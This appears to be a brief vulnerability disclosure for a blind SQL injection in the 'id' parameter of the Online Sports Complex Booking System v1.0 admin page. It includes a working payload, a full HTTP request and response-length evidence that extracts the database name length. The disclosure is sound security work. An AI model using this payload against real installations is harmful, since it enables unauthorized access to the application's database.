# Online Sports Complex Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15236/online-sports-complex-booking-system-phpmysql-free-source-code.html

Vulnerability File: /scbs/admin/?page=clients/manage_client&id=

Vulnerability location: /scbs/admin/?page=clients/manage_client&id=, id

Current database name: scbs_db,length is 7

[+] Payload: /scbs/admin/?page=clients/manage_client&id=1%27%20and%20length(database())%20=7%20--+

```sql
GET /scbs/admin/?page=clients/manage_client&id=1%27%20and%20length(database())%20=7%20--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=gp584rjk4ugbjakmto03cu7pco
Connection: close

// Leak place ---> id
```

When length (database ()) = 6, Content-Length: 24661
![image](https://user-images.githubusercontent.com/54017627/165216798-990bb9d6-46d4-4e55-9b01-dc0a82789f8d.png)

![image](https://user-images.githubusercontent.com/54017627/165216721-17844e2b-fb45-4238-9c2d-4b336401f9d7.png)

When length (database ()) = 7, Content-Length: 24718
![image](https://user-images.githubusercontent.com/54017627/165216774-aa7378f7-6008-472c-ae1d-321329d70dfa.png)

![image](https://user-images.githubusercontent.com/54017627/165216674-1242da03-c29e-4826-997d-6f844d36c6f5.png)

